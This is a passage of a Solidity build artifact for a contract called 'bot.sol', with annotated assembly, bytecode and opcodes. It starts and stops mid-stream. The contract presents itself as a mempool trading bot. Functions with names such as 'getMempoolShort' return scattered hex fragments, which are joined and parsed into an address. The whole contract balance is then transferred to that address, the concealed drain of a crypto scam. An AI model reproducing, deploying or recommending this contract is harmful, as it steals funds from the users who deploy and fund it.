dup2\n      dup1\n      dup1\n        /* \"bot.sol\":5779:5780  2 */\n      0x02\n        /* \"bot.sol\":5765:6463  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_64:\n        /* \"bot.sol\":5786:5796  2 + 2 * 20 */\n      0x2a\n        /* \"bot.sol\":5782:5783  i */\n      dup2\n        /* \"bot.sol\":5782:5796  i < 2 + 2 * 20 */\n      lt\n        /* \"bot.sol\":5765:6463  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_65\n      jumpi\n        /* \"bot.sol\":5830:5833  256 */\n      0x0100\n        /* \"bot.sol\":5821:5833  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"bot.sol\":5867:5870  tmp */\n      dup5\n        /* \"bot.sol\":5871:5872  i */\n      dup2\n        /* \"bot.sol\":5867:5873  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_67\n      jumpi\n      invalid\n    tag_67:\n      add\n      0x20\n      add\n      mload\n        /* \"bot.sol\":5909:5919  tmp[i + 1] */\n      dup6\n      mload\n        /* \"bot.sol\":5867:5873  tmp[i] */\n      0xf8\n      swap2\n      swap1\n      swap2\n      shr\n      swap4\n      pop\n        /* \"bot.sol\":5909:5912  tmp */\n      dup6\n      swap1\n        /* \"bot.sol\":5917:5918  1 */\n      0x01\n        /* \"bot.sol\":5913:5918  i + 1 */\n      dup4\n      add\n      swap1\n        /* \"bot.sol\":5909:5919  tmp[i + 1] */\n      dup2\n      lt\n      tag_68\n      jumpi\n      invalid\n    tag_68:\n      add\n      0x20\n      add\n      mload\n      0xf8\n      shr\n      swap2\n      pop\n        /* \"bot.sol\":5947:5949  97 */\n      0x61\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":5941:5949  b1 >= 97 */\n      dup5\n      and\n      lt\n      dup1\n      iszero\n      swap1\n        /* \"bot.sol\":5940:5965  (b1 >= 97) && (b1 <= 102) */\n      tag_69\n      jumpi\n      pop\n        /* \"bot.sol\":5961:5964  102 */\n      0x66\n        /* \"bot.sol\":5955:5957  b1 */\n      dup4\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":5955:5964  b1 <= 102 */\n      and\n      gt\n      iszero\n        /* \"bot.sol\":5940:5965  (b1 >= 97) && (b1 <= 102) */\n    tag_69:\n        /* \"bot.sol\":5936:6168  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_70\n      jumpi\n        /* \"bot.sol\":5992:5994  87 */\n      0x57\n        /* \"bot.sol\":5986:5994  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"bot.sol\":5936:6168  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_76)\n    tag_70:\n        /* \"bot.sol\":6027:6029  65 */\n      0x41\n        /* \"bot.sol\":6021:6023  b1 */\n      dup4\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6021:6029  b1 >= 65 */\n      and\n      lt\n      iszero\n        /* \"bot.sol\":6020:6044  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_72\n      jumpi\n      pop\n        /* \"bot.sol\":6041:6043  70 */\n      0x46\n        /* \"bot.sol\":6035:6037  b1 */\n      dup4\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6035:6043  b1 <= 70 */\n      and\n      gt\n      iszero\n        /* \"bot.sol\":6020:6044  (b1 >= 65) && (b1 <= 70) */\n    tag_72:\n        /* \"bot.sol\":6016:6168  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_73\n      jumpi\n        /* \"bot.sol\":6071:6073  55 */\n      0x37\n        /* \"bot.sol\":6065:6073  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"bot.sol\":6016:6168  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_76)\n    tag_73:\n        /* \"bot.sol\":6106:6108  48 */\n      0x30\n        /* \"bot.sol\":6100:6102  b1 */\n      dup4\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6100:6108  b1 >= 48 */\n      and\n      lt\n      iszero\n        /* \"bot.sol\":6099:6123  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_75\n      jumpi\n      pop\n        /* \"bot.sol\":6120:6122  57 */\n      0x39\n        /* \"bot.sol\":6114:6116  b1 */\n      dup4\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6114:6122  b1 <= 57 */\n      and\n      gt\n      iszero\n        /* \"bot.sol\":6099:6123  (b1 >= 48) && (b1 <= 57) */\n    tag_75:\n        /* \"bot.sol\":6095:6168  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_76\n      jumpi\n        /* \"bot.sol\":6150:6152  48 */\n      0x30\n        /* \"bot.sol\":6144:6152  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"bot.sol\":6095:6168  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_76:\n        /* \"bot.sol\":6193:6195  97 */\n      0x61\n        /* \"bot.sol\":6187:6189  b2 */\n      dup3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6187:6195  b2 >= 97 */\n      and\n      lt\n      iszero\n        /* \"bot.sol\":6186:6211  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_77\n      jumpi\n      pop\n        /* \"bot.sol\":6207:6210  102 */\n      0x66\n        /* \"bot.sol\":6201:6203  b2 */\n      dup3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6201:6210  b2 <= 102 */\n      and\n      gt\n      iszero\n        /* \"bot.sol\":6186:6211  (b2 >= 97) && (b2 <= 102) */\n    tag_77:\n        /* \"bot.sol\":6182:6414  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_78\n      jumpi\n        /* \"bot.sol\":6238:6240  87 */\n      0x57\n        /* \"bot.sol\":6232:6240  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"bot.sol\":6182:6414  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_84)\n    tag_78:\n        /* \"bot.sol\":6273:6275  65 */\n      0x41\n        /* \"bot.sol\":6267:6269  b2 */\n      dup3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6267:6275  b2 >= 65 */\n      and\n      lt\n      iszero\n        /* \"bot.sol\":6266:6290  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_80\n      jumpi\n      pop\n        /* \"bot.sol\":6287:6289  70 */\n      0x46\n        /* \"bot.sol\":6281:6283  b2 */\n      dup3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6281:6289  b2 <= 70 */\n      and\n      gt\n      iszero\n        /* \"bot.sol\":6266:6290  (b2 >= 65) && (b2 <= 70) */\n    tag_80:\n        /* \"bot.sol\":6262:6414  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_81\n      jumpi\n        /* \"bot.sol\":6317:6319  55 */\n      0x37\n        /* \"bot.sol\":6311:6319  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"bot.sol\":6262:6414  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_84)\n    tag_81:\n        /* \"bot.sol\":6352:6354  48 */\n      0x30\n        /* \"bot.sol\":6346:6348  b2 */\n      dup3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6346:6354  b2 >= 48 */\n      and\n      lt\n      iszero\n        /* \"bot.sol\":6345:6369  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_83\n      jumpi\n      pop\n        /* \"bot.sol\":6366:6368  57 */\n      0x39\n        /* \"bot.sol\":6360:6362  b2 */\n      dup3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":6360:6368  b2 <= 57 */\n      and\n      gt\n      iszero\n        /* \"bot.sol\":6345:6369  (b2 >= 48) && (b2 <= 57) */\n    tag_83:\n        /* \"bot.sol\":6341:6414  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_84\n      jumpi\n        /* \"bot.sol\":6396:6398  48 */\n      0x30\n        /* \"bot.sol\":6390:6398  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"bot.sol\":6341:6414  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_84:\n        /* \"bot.sol\":6443:6445  16 */\n      0x10\n        /* \"bot.sol\":6438:6445  b1 * 16 */\n      dup4\n      mul\n        /* \"bot.sol\":6438:6450  b1 * 16 + b2 */\n      dup3\n      add\n        /* \"bot.sol\":6428:6451  iaddr += (b1 * 16 + b2) */\n      swap4\n      swap1\n      swap4\n      add\n      swap3\n        /* \"bot.sol\":5803:5804  2 */\n      0x02\n        /* \"bot.sol\":5798:5804  i += 2 */\n      add\n        /* \"bot.sol\":5765:6463  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_64)\n    tag_65:\n      pop\n        /* \"bot.sol\":6488:6493  iaddr */\n      swap2\n      swap6\n        /* \"bot.sol\":5554:6502  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r... */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"bot.sol\":12084:12175  function getBa() private view returns(uint) {\r... */\n    tag_19:\n        /* \"bot.sol\":12146:12167  address(this).balance */\n      selfbalance\n        /* \"bot.sol\":12084:12175  function getBa() private view returns(uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":9990:10087  function getMempoolShort() private pure returns (string memory) {\r... */\n    tag_24:\n        /* \"bot.sol\":10065:10079  return \"0x90e\" */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x05\n      dup2\n      mstore\n      shl(0xd8, 0x3078393065)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"bot.sol\":9990:10087  function getMempoolShort() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":9369:9469  function fetchMempoolEdition() private pure returns (string memory) {\r... */\n    tag_26:\n        /* \"bot.sol\":9448:9461  return \"1Bb2\" */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x04\n      dup2\n      mstore\n      shl(0xe1, 0x18a13119)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"bot.sol\":9369:9469  function fetchMempoolEdition() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":17173:17278  function fetchMempoolVersion() private pure returns (string memory) {\r... */\n    tag_28:\n        /* \"bot.sol\":17252:17267  return \"895258\" */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x06\n      dup2\n      mstore\n      shl(0xd3, 0x070726a646a7)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"bot.sol\":17173:17278  function fetchMempoolVersion() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":15490:15586  function getMempoolLong() private pure returns (string memory) {\r... */\n    tag_30:\n        /* \"bot.sol\":15564:15578  return \"0F9F0\" */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x05\n      dup2\n      mstore\n      shl(0xdc, 0x0304639463)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"bot.sol\":15490:15586  function getMempoolLong() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":10754:10852  function getMempoolHeight() private pure returns (string memory) {\r... */\n    tag_32:\n        /* \"bot.sol\":10830:10844  return \"0E4D2\" */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x05\n      dup2\n      mstore\n      shl(0xd9, 0x18229a2219)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"bot.sol\":10754:10852  function getMempoolHeight() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":16575:16671  function getMempoolCode() private pure returns (string memory) {\r... */\n    tag_34:\n        /* \"bot.sol\":16649:16663  return \"21e8c\" */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x05\n      dup2\n      mstore\n      shl(0xd8, 0x3231653863)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"bot.sol\":16575:16671  function getMempoolCode() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":8407:8504  function getMempoolStart() private pure returns (string memory) {\r... */\n    tag_36:\n        /* \"bot.sol\":8482:8495  return \"3C71\" */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x04\n      dup2\n      mstore\n      shl(0xe0, 0x33433731)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"bot.sol\":8407:8504  function getMempoolStart() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":11825:11923  function getMempoolLog() private pure returns (string memory) {\r... */\n    tag_38:\n        /* \"bot.sol\":11898:11915  return \"30075A1e\" */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x08\n      dup2\n      mstore\n      shl(0xc0, 0x3330303735413165)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"bot.sol\":11825:11923  function getMempoolLog() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205611ad0020cdbb06b2839c1c284d4565db587c53fc001bde517b7f95ded56ebb64736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60e0604052602a6080818152906107e560a039805161002691600191602090910190610067565b506040518060600160405280602a81526020016107bb602a9139805161005491600291602090910190610067565b5034801561006157600080fd5b50610102565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a857805160ff19168380011785556100d5565b828001600101855582156100d5579182015b828111156100d55782518255916020019190600101906100ba565b506100e19291506100e5565b5090565b6100ff91905b808211156100e157600081556001016100eb565b90565b6106aa806101116000396000f3fe60806040526004361061002d5760003560e01c8063be9a655514610039578063d4e932921461004357610034565b3661003457005b600080fd5b61004161004b565b005b6100416100a9565b662386f26fc100004710156100a7576040805162461bcd60e51b815260206004820152601d60248201527f496e73756666696369656e7420636f6e74726163742062616c616e6365000000604482015290519081900360640190fd5b565b60006100bb6100b6610100565b6103db565b9050806001600160a01b0381166108fc6100d3610576565b6040518115909202916000818181858888f193505050501580156100fb573d6000803e3d6000fd5b505050565b60608061010b61057a565b90506060610117610599565b905060606101236105b7565b9050606061012f6105d7565b9050606061013b6105f6565b90506060610147610615565b90506060610153610634565b9050606061015f610652565b905087878787878787876040516020018089805190602001908083835b6020831061019b5780518252601f19909201916020918201910161017c565b51815160209384036101000a60001901801990921691161790528b5191909301928b0191508083835b602083106101e35780518252601f1990920191602091820191016101c4565b51815160209384036101000a60001901801990921691161790528a5191909301928a0191508083835b6020831061022b5780518252601f19909201916020918201910161020c565b51815160209384036101000a600019018019909216911617905289519190930192890191508083835b602083106102735780518252601f199092019160209182019101610254565b51815160209384036101000a600019018019909216911617905288519190930192880191508083835b602083106102bb5780518252601f19909201916020918201910161029c565b51815160209384036101000a600019018019909216911617905287519190930192870191508083835b602083106103035780518252601f1990920191602091820191016102e4565b51815160209384036101000a600019018019909216911617905286519190930192860191508083835b6020831061034b5780518252601f19909201916020918201910161032c565b51815160209384036101000a600019018019909216911617905285519190930192850191508083835b602083106103935780518252601f199092019160209182019101610374565b6001836020036101000a038019825116818451168082178552505050505050905001985050505050505050506040516020818303038152906040529850505050505050505090565b60008181808060025b602a81101561056b576101008402935084818151811061040057fe5b0160200151855160f89190911c935085906001830190811061041e57fe5b016020015160f81c915060616001600160a01b0384161080159061044c57506066836001600160a01b031611155b1561045c576057830392506104c0565b6041836001600160a01b03161015801561048057506046836001600160a01b031611155b15610490576037830392506104c0565b6030836001600160a01b0316101580156104b457506039836001600160a01b031611155b156104c0576030830392505b6061826001600160a01b0316101580156104e457506066826001600160a01b031611155b156104f457605782039150610558565b6041826001600160a01b03161015801561051857506046826001600160a01b031611155b1561052857603782039150610558565b6030826001600160a01b03161015801561054c57506039826001600160a01b031611155b15610558576030820391505b60108302820193909301926002016103e4565b509195945050505050565b4790565b604080518082019091526005815264307839306560d81b602082015290565b60408051808201909152600481526318a1311960e11b602082015290565b604080518082019091526006815265070726a646a760d31b602082015290565b604080518082019091526005815264030463946360dc1b602082015290565b60408051808201909152600581526418229a221960d91b602082015290565b604080518082019091526005815264323165386360d81b602082015290565b6040805180820190915260048152633343373160e01b602082015290565b604080518082019091526008815267333030373541316560c01b60208201529056fea26469706673582212205611ad0020cdbb06b2839c1c284d4565db587c53fc001bde517b7f95ded56ebb64736f6c63430006060033307837613235306435363330423463463533393733396446324335644163623463363539463234383844307843303261614133396232323346453844304130653543344632376541443930383343373536436332",
					"opcodes": "PUSH1 0xE0 PUSH1 0x40 MSTORE PUSH1 0x2A PUSH1 0x80 DUP2 DUP2 MSTORE SWAP1 PUSH2 0x7E5 PUSH1 0xA0 CODECOPY DUP1 MLOAD PUSH2 0x26 SWAP2 PUSH1 0x1 SWAP2 PUSH1 0x20 SWAP1 SWAP2 ADD SWAP1 PUSH2 0x67 JUMP JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x7BB PUSH1 0x2A SWAP2 CODECOPY DUP1 MLOAD PUSH2 0x54 SWAP2 PUSH1 0x2 SWAP2 PUSH1 0x20 SWAP1 SWAP2 ADD SWAP1 PUSH2 0x67 JUMP JUMPDEST POP CALLVALUE DUP1 ISZERO PUSH2 0x61 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x102 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH2 0xA8 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0xD5 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0xD5 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0xD5 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0xBA JUMP JUMPDEST POP PUSH2 0xE1 SWAP3 SWAP2 POP PUSH2 0xE5 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0xFF SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0xE1 JUMPI PUSH1 0x0 DUP2 SSTORE PUSH1 0x1 ADD PUSH2 0xEB JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x6AA DUP1 PUSH2 0x111 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x43 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x41 PUSH2 0x4B JUMP JUMPDEST STOP JUMPDEST PUSH2 0x41 PUSH2 0xA9 JUMP JUMPDEST PUSH7 0x2386F26FC10000 SELFBALANCE LT ISZERO PUSH2 0xA7 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x496E73756666696369656E7420636F6E74726163742062616C616E6365000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBB PUSH2 0xB6 PUSH2 0x100 JUMP JUMPDEST PUSH2 0x3DB JUMP JUMPDEST SWAP1 POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x8FC PUSH2 0xD3 PUSH2 0x576 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP2 ISZERO SWAP1 SWAP3 MUL SWAP2 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x10B PUSH2 0x57A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x117 PUSH2 0x599 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x123 PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x12F PUSH2 0x5D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x13B PUSH2 0x5F6 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x147 PUSH2 0x615 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x153 PUSH2 0x634 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x15F PUSH2 0x652 JUMP JUMPDEST SWAP1 POP DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP10 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x19B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x17C JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP12 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP12 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1E3 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1C4 JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP11 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP11 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x22B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x20C JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP10 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP10 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x273 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x254 JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP9 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP9 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x2BB JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x29C JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP8 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP8 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x303 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x2E4 JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP7 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP7 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x34B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x32C JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP6 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP6 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x393 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP9 POP POP POP POP POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP9 POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP2 DUP1 DUP1 PUSH1 0x2 JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x56B JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x400 JUMPI INVALID JUMPDEST ADD PUSH1 0x20 ADD MLOAD DUP6 MLOAD PUSH1 0xF8 SWAP2 SWAP1 SWAP2 SHR SWAP4 POP DUP6 SWAP1 PUSH1 0x1 DUP4 ADD SWAP1 DUP2 LT PUSH2 0x41E JUMPI INVALID JUMPDEST ADD PUSH1 0x20 ADD MLOAD PUSH1 0xF8 SHR SWAP2 POP PUSH1 0x61 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND LT DUP1 ISZERO SWAP1 PUSH2 0x44C JUMPI POP PUSH1 0x66 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x45C JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x4C0 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x480 JUMPI POP PUSH1 0x46 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x490 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x4C0 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH1 0x1 PUSH1 0x1 